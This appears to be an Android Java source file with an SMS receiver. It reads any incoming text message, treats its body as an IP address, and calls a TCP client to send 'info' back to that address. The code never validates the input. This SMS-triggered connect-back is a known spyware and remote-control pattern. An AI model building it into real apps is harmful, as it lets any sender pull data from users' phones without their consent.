package com.replica;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		//---get the SMS message passed in---
		Bundle bundle = intent.getExtras();        
		SmsMessage[] msgs = null;
	    if (bundle != null) {
	    	//---retrieve the SMS message received---
	        Object[] pdus = (Object[]) bundle.get("pdus");
	        msgs = new SmsMessage[pdus.length];            
	        for (int i=0; i<msgs.length; i++){
	        	msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
	        	String message = msgs[i].getMessageBody().toString();
	        	String displaystr = "";
	        	displaystr += "SMS from " + msgs[i].getOriginatingAddress();                     
	        	displaystr += ": ";
	        	displaystr += message;
	        	displaystr += "\n";
	        	//---display the new SMS message---
		        Toast.makeText(context, displaystr, Toast.LENGTH_SHORT).show();
		        String ipAddr = message;
		        Toast.makeText(context, "Sending back info to " + ipAddr, Toast.LENGTH_SHORT).show();
		        TCPClient.sendMessage(ipAddr);
		        Toast.makeText(context, "Message sent.", Toast.LENGTH_SHORT).show();
	        }	        
	    }
	}
}
